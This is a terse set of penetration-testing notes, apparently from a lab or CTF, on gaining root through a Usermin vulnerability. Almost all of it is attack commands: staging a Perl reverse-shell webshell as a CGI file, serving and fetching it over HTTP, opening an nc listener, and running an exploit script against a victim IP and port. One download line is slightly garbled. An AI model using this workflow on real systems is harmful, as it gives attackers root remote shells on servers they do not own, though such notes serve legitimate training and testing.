process runs as root usually- whatever we do will be with root privilege

if usermin vulnerability is present -and we have access to the server- we have root

cp /usr/share/webshells/perl/perl-reverse-shell.pl rshell.cgi
python -m SimpleHTTPServer
---
wget | curl http://VICTIM:PORT/rshell.cgi -O rshell.cgi
---
nc -vlp PORT
perl ./2017.pl VICTIM-IP PORT rshell.cgi 0

As this is a pl server, cgi files will be executed.
